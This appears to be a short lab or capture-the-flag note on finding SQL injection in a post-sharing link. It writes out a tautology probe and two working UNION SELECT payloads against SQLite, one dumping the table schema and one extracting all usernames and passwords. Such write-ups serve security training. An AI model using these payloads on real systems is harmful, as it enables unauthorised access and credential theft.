SQL Injection within shares link

When sharing a link to your post, you get this request. Adding `' or '1'='1` gets a result for a username coder123, indicating we do have sqlinjection. With just a `'` added it will give an error. 

Note: URL encoded values at the end of this URI did not pass through. Not sure why?

![[Pasted image 20260128103952.png]]

Seeing the results we can already assume that it is 6 columns for the return values, and you can see the data types too. id is a number and the rest are text. A Union select statement can help here.

Pulling all tables information: 
```
' UNION SELECT null,GROUP_CONCAT(name),GROUP_CONCAT(sql),null,null,null FROM sqlite_master WHERE type='table' --
```

![[Pasted image 20260128104557.png]]

We see the users value and can grab all users/passwords with this modified UNION statement:
```
' UNION SELECT null,GROUP_CONCAT(username),GROUP_CONCAT(password),null,null,null FROM users --
```

![[Pasted image 20260128104739.png]]